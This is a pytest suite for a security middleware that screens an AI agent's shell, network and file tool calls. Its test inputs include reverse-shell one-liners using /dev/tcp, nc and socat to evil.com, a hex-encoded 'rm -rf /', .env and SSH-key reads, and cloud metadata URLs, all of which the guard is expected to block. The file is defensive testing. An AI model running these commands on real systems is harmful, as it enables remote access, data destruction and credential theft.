"""Tests for tools/guard.py — ToolGuard security middleware."""

from __future__ import annotations

import tempfile
from pathlib import Path

import pytest

from tools.guard import (
    Capability,
    ToolGuard,
    _extract_urls,
    _host_from_url,
    _is_private_ip,
    _match_blocked_path,
)
from tools.tool import Tool, ToolResult

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


class _FakeTool(Tool):
    """Minimal tool for testing ToolGuard.pre_check()."""
    name = "fake"
    description = "test tool"
    parameters = {}
    capabilities: set[Capability] = set()

    async def execute(self, **kwargs):
        return ToolResult(success=True, content="")


@pytest.fixture
def workspace():
    with tempfile.TemporaryDirectory() as tmp:
        yield Path(tmp)


@pytest.fixture
def guard(workspace):
    return ToolGuard(workspace, scope="core")


# ---------------------------------------------------------------------------
# Capability enum
# ---------------------------------------------------------------------------


class TestCapability:
    def test_five_values(self):
        vals = set(Capability)
        assert vals == {"shell", "network", "write", "read", "delegate"}

    def test_string_equal(self):
        assert Capability.SHELL == "shell"
        assert Capability.NETWORK == "network"


# ---------------------------------------------------------------------------
# ToolGuard — empty capabilities (always allowed)
# ---------------------------------------------------------------------------


class TestEmptyCapabilities:
    def test_pure_computation_tool_passes(self, guard):
        allowed, reason = guard.pre_check("calc", set(), {"expr": "1+1"})
        assert allowed
        assert reason == ""

    def test_fake_tool_passes(self, guard):
        tool = _FakeTool()
        allowed, reason = guard.pre_check(tool.name, tool.capabilities, {})
        assert allowed

    def test_unknown_args_ignored(self, guard):
        allowed, _ = guard.pre_check("t", set(), {"arbitrary": "data"})
        assert allowed


# ---------------------------------------------------------------------------
# SHELL capability
# ---------------------------------------------------------------------------


class TestShellBlocking:
    def test_allowed_when_shell_enabled(self, guard):
        guard.allow_shell = True
        allowed, _ = guard.pre_check("bash", {Capability.SHELL}, {"command": "ls"})
        assert allowed

    def test_blocked_when_shell_disabled(self, guard):
        guard.allow_shell = False
        allowed, reason = guard.pre_check("bash", {Capability.SHELL}, {"command": "ls"})
        assert not allowed
        assert "shell" in reason.lower()

    def test_subagent_default_disallows_shell(self, workspace):
        guard = ToolGuard(workspace, scope="subagent", allow_shell=False, allow_network=False)
        allowed, reason = guard.pre_check("bash", {Capability.SHELL}, {"command": "ls"})
        assert not allowed
        assert "subagent" in reason.lower()


class TestShellInjectionDetection:
    def test_blocks_dollar_subshell(self, guard):
        allowed, reason = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "echo $(whoami)"}
        )
        assert not allowed
        assert "injection" in reason

    def test_blocks_backtick_subshell(self, guard):
        allowed, reason = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "echo `whoami`"}
        )
        assert not allowed

    def test_blocks_variable_expansion(self, guard):
        allowed, reason = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "cat ${HOME}/.env"}
        )
        assert not allowed

    def test_blocks_dev_tcp(self, guard):
        allowed, reason = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"}
        )
        assert not allowed

    def test_blocks_hex_encoding_bypass(self, guard):
        allowed, reason = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "$'\\x72\\x6d' -rf /"}
        )
        assert not allowed

    def test_blocks_nc_reverse_shell(self, guard):
        allowed, reason = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "nc -l -e /bin/bash"}
        )
        assert not allowed

    def test_blocks_socat(self, guard):
        allowed, reason = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "socat exec:bash tcp:evil.com:4444"}
        )
        assert not allowed

    def test_allows_safe_command(self, guard):
        allowed, _ = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "git log --oneline -n 10"}
        )
        assert allowed

    def test_allows_package_install(self, guard):
        allowed, _ = guard.pre_check(
            "bash", {Capability.SHELL}, {"command": "pip install requests"}
        )
        assert allowed

    def test_no_command_key_passes(self, guard):
        allowed, _ = guard.pre_check("bash", {Capability.SHELL}, {})
        assert allowed


# ---------------------------------------------------------------------------
# NETWORK capability
# ---------------------------------------------------------------------------


class TestNetworkBlocking:
    def test_allowed_when_network_enabled(self, guard):
        guard.allow_network = True
        allowed, _ = guard.pre_check("curl", {Capability.NETWORK}, {"url": "https://example.com"})
        assert allowed

    def test_blocked_when_network_disabled(self, guard):
        guard.allow_network = False
        allowed, reason = guard.pre_check("curl", {Capability.NETWORK}, {"url": "https://example.com"})
        assert not allowed
        assert "network" in reason.lower()

    def test_subagent_default_disallows_network(self, workspace):
        guard = ToolGuard(workspace, scope="subagent", allow_network=False, allow_shell=False)
        allowed, reason = guard.pre_check("curl", {Capability.NETWORK}, {"url": "https://example.com"})
        assert not allowed
        assert "subagent" in reason.lower()


class TestSSRFDetection:
    def test_blocks_localhost_url(self, guard):
        allowed, reason = guard.pre_check(
            "curl", {Capability.NETWORK}, {"url": "http://localhost:8080/admin"}
        )
        assert not allowed
        assert "SSRF" in reason

    def test_blocks_127_0_0_1(self, guard):
        allowed, reason = guard.pre_check(
            "fetch", {Capability.NETWORK}, {"url": "http://127.0.0.1/api"}
        )
        assert not allowed

    def test_blocks_private_ip_10(self, guard):
        allowed, reason = guard.pre_check(
            "curl", {Capability.NETWORK}, {"command": "curl http://10.0.0.1:8080/secret"}
        )
        assert not allowed
        assert "private" in reason

    def test_blocks_private_ip_192_168(self, guard):
        allowed, reason = guard.pre_check(
            "curl", {Capability.NETWORK}, {"command": "curl http://192.168.1.1/admin"}
        )
        assert not allowed

    def test_blocks_private_ip_172_16(self, guard):
        allowed, reason = guard.pre_check(
            "curl", {Capability.NETWORK}, {"command": "curl http://172.16.0.1:3000/"}
        )
        assert not allowed

    def test_blocks_aws_metadata_endpoint(self, guard):
        allowed, reason = guard.pre_check(
            "curl", {Capability.NETWORK}, {"command": "curl http://169.254.169.254/latest/meta-data/"}
        )
        assert not allowed

    def test_blocks_gcp_metadata_hostname(self, guard):
        allowed, reason = guard.pre_check(
            "curl", {Capability.NETWORK},
            {"command": "curl http://metadata.google.internal/"}
        )
        assert not allowed

    def test_blocks_0_0_0_0(self, guard):
        allowed, reason = guard.pre_check(
            "curl", {Capability.NETWORK}, {"command": "curl http://0.0.0.0:80/"}
        )
        assert not allowed

    def test_allows_public_url(self, guard):
        allowed, _ = guard.pre_check(
            "curl", {Capability.NETWORK}, {"command": "curl https://api.github.com/repos/mybot"}
        )
        assert allowed

    def test_allows_public_api(self, guard):
        allowed, _ = guard.pre_check(
            "fetch", {Capability.NETWORK}, {"url": "https://jsonplaceholder.typicode.com/todos/1"}
        )
        assert allowed

    def test_blocks_url_in_any_string_arg(self, guard):
        """SSRF check scans all string values, not just the 'url' key."""
        allowed, reason = guard.pre_check(
            "webhook", {Capability.NETWORK},
            {"endpoint": "http://169.254.169.254/iam/", "method": "POST"},
        )
        assert not allowed

    def test_no_urls_in_args_passes(self, guard):
        allowed, _ = guard.pre_check(
            "ping", {Capability.NETWORK}, {"host": "example.com"}
        )
        assert allowed  # plain hostname, no http:// prefix, no URL matched


# ---------------------------------------------------------------------------
# FILE_READ / FILE_WRITE capabilities
# ---------------------------------------------------------------------------


class TestSensitivePathBlocking:
    def test_blocks_env_file_read(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": ".env"}
        )
        assert not allowed
        assert "blocked file extension" in reason

    def test_blocks_env_file_write(self, guard):
        allowed, reason = guard.pre_check(
            "write", {Capability.FILE_WRITE}, {"path": ".env.production"}
        )
        assert not allowed

    def test_blocks_pem_key(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": "cert.pem"}
        )
        assert not allowed

    def test_blocks_key_file(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": "id_rsa.key"}
        )
        assert not allowed

    def test_blocks_p12_keystore(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": "keystore.p12"}
        )
        assert not allowed

    def test_blocks_path_with_credentials(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": "config/credentials.yml"}
        )
        assert not allowed
        assert "credentials" in reason

    def test_blocks_path_with_secret(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": "k8s/secret.yaml"}
        )
        assert not allowed

    def test_blocks_git_dir(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": ".git/config"}
        )
        assert not allowed
        assert ".git" in reason

    def test_blocks_ssh_dir(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": ".ssh/id_rsa"}
        )
        assert not allowed

    def test_blocks_token_file(self, guard):
        allowed, reason = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": "auth_token.txt"}
        )
        assert not allowed

    def test_allows_normal_txt_file(self, guard):
        allowed, _ = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": "README.md"}
        )
        assert allowed

    def test_allows_normal_py_file(self, guard):
        allowed, _ = guard.pre_check(
            "write", {Capability.FILE_WRITE}, {"path": "src/main.py"}
        )
        assert allowed

    def test_allows_env_example(self, guard):
        """'.env.example' should NOT be blocked — only exact .env suffix."""
        allowed, _ = guard.pre_check(
            "read", {Capability.FILE_READ}, {"path": ".env.example"}
        )
        assert allowed

    def test_backward_compat_file_path_param(self, guard):
        """Old 'file_path' parameter name is still accepted."""
        allowed, _ = guard.pre_check(
            "read", {Capability.FILE_READ}, {"file_path": "README.md"}
        )
        assert allowed

    def test_dir_path_param_for_ls_tool(self, guard):
        """'dir_path' parameter name (used by ls tool) is checked."""
        allowed, _ = guard.pre_check(
            "ls", {Capability.FILE_READ}, {"dir_path": "src"}
        )
        assert allowed

    def test_dir_path_blocks_sensitive(self, guard):
        """'dir_path' pointing to sensitive path is blocked."""
        allowed, reason = guard.pre_check(
            "ls", {Capability.FILE_READ}, {"dir_path": ".git"}
        )
        assert not allowed
        assert ".git" in reason


# ---------------------------------------------------------------------------
# Multiple capabilities
# ---------------------------------------------------------------------------


class TestMultipleCapabilities:
    def test_bash_tool_capabilities(self, guard):
        """BashTool declares SHELL + NETWORK + FILE_READ + FILE_WRITE."""
        caps = {Capability.SHELL, Capability.NETWORK, Capability.FILE_READ, Capability.FILE_WRITE}
        # Safe command should pass all checks
        allowed, _ = guard.pre_check("bash", caps, {"command": "ls -la"})
        assert allowed

    def test_bash_with_injection_and_sensitive_path(self, guard):
        """Command injection check runs first, before file checks."""
        caps = {Capability.SHELL, Capability.NETWORK, Capability.FILE_READ, Capability.FILE_WRITE}
        allowed, reason = guard.pre_check(
            "bash", caps, {"command": "echo $(whoami)", "path": "README.md"}
        )
        # Injection fires first
        assert not allowed
        assert "injection" in reason


# ---------------------------------------------------------------------------
# Scope-based policy (integration-style)
# ---------------------------------------------------------------------------


class TestScopePolicies:
    def test_core_full_access(self, workspace):
        guard = ToolGuard(workspace, scope="core", allow_network=True, allow_shell=True)
        assert guard.pre_check("bash", {Capability.SHELL}, {"command": "ls"})[0]
        assert guard.pre_check("curl", {Capability.NETWORK}, {"command": "curl https://api.example.com"})[0]

    def test_subagent_restricted(self, workspace):
        guard = ToolGuard(workspace, scope="subagent", allow_network=False, allow_shell=False)
        # Shell blocked
        assert not guard.pre_check("bash", {Capability.SHELL}, {"command": "ls"})[0]
        # Network blocked
        assert not guard.pre_check("curl", {Capability.NETWORK}, {"url": "https://example.com"})[0]
        # File read still OK (sensitive path check still applies)
        assert guard.pre_check("read", {Capability.FILE_READ}, {"path": "README.md"})[0]

    def test_memory_restricted(self, workspace):
        guard = ToolGuard(workspace, scope="memory", allow_network=False, allow_shell=False)
        assert not guard.pre_check("bash", {Capability.SHELL}, {"command": "ls"})[0]
        assert not guard.pre_check("curl", {Capability.NETWORK}, {"url": "https://example.com"})[0]


# ---------------------------------------------------------------------------
# ToolRegistry integration
# ---------------------------------------------------------------------------


class TestRegistryIntegration:
    @pytest.mark.asyncio
    async def test_tool_blocked_by_guard(self, workspace):
        from tools.registry import ToolRegistry

        guard = ToolGuard(workspace, scope="core", allow_shell=True, allow_network=True)
        registry = ToolRegistry(guard=guard)

        tool = _FakeTool()
        tool.capabilities = {Capability.SHELL}
        tool.name = "dangerous"
        registry.register(tool)

        result = await registry.execute("dangerous", {"command": "$(echo pwned)"})
        assert not result.success
        assert "injection" in result.error

    @pytest.mark.asyncio
    async def test_tool_allowed_by_guard(self, workspace):
        from tools.registry import ToolRegistry

        guard = ToolGuard(workspace, scope="core", allow_shell=True, allow_network=True)
        registry = ToolRegistry(guard=guard)

        tool = _FakeTool()
        tool.name = "safe"
        tool.capabilities = set()  # pure computation
        registry.register(tool)

        result = await registry.execute("safe", {})
        assert result.success

    @pytest.mark.asyncio
    async def test_registry_without_guard_skips_check(self):
        from tools.registry import ToolRegistry

        registry = ToolRegistry()  # no guard
        tool = _FakeTool()
        tool.name = "unchecked"
        tool.capabilities = {Capability.SHELL}
        registry.register(tool)

        # Should run without any security checks
        result = await registry.execute("unchecked", {"command": "$(echo not checked)"})
        assert result.success


# ---------------------------------------------------------------------------
# URL extraction helpers
# ---------------------------------------------------------------------------


class TestExtractUrls:
    def test_single_url(self):
        urls = _extract_urls("curl https://example.com/api")
        assert "https://example.com/api" in urls

    def test_multiple_urls(self):
        urls = _extract_urls("curl https://a.com && wget http://b.com")
        assert len(urls) == 2

    def test_no_url(self):
        assert _extract_urls("echo hello") == []

    def test_url_with_port_and_path(self):
        urls = _extract_urls("fetch http://10.0.0.1:8080/admin/secret?key=val")
        assert "http://10.0.0.1:8080/admin/secret?key=val" in urls


class TestHostFromUrl:
    def test_standard_url(self):
        assert _host_from_url("https://example.com/path") == "example.com"

    def test_url_with_port(self):
        assert _host_from_url("http://example.com:8080/api") == "example.com"

    def test_ip_url(self):
        assert _host_from_url("http://192.168.1.1/admin") == "192.168.1.1"

    def test_ipv6_bracketed(self):
        host = _host_from_url("http://[::1]:8080/api")
        assert host == "::1"


class TestIsPrivateIP:
    def test_loopback(self):
        assert _is_private_ip("127.0.0.1")
        assert _is_private_ip("::1")

    def test_private_ranges(self):
        assert _is_private_ip("10.0.0.1")
        assert _is_private_ip("172.16.0.1")
        assert _is_private_ip("192.168.1.1")

    def test_link_local(self):
        assert _is_private_ip("169.254.1.1")
        assert _is_private_ip("fe80::1")

    def test_public_ip(self):
        assert not _is_private_ip("8.8.8.8")
        assert not _is_private_ip("1.1.1.1")

    def test_hostname_not_ip(self):
        assert not _is_private_ip("example.com")
        assert not _is_private_ip("metadata.google.internal")


class TestMatchBlockedPath:
    def test_env_extension(self):
        assert "blocked file extension" in _match_blocked_path(".env")
        assert "blocked file extension" in _match_blocked_path("project/.env")

    def test_pem_key(self):
        assert "blocked file extension" in _match_blocked_path("cert.pem")
        assert "blocked file extension" in _match_blocked_path("secret.key")

    def test_git_dir(self):
        assert "blocked path pattern" in _match_blocked_path(".git/config")
        assert "blocked path pattern" in _match_blocked_path("src/.git/HEAD")

    def test_credentials(self):
        assert "blocked path pattern" in _match_blocked_path("config/credentials.yml")

    def test_normal_path(self):
        assert _match_blocked_path("README.md") is None
        assert _match_blocked_path("src/main.py") is None
        assert _match_blocked_path(".gitignore") is None
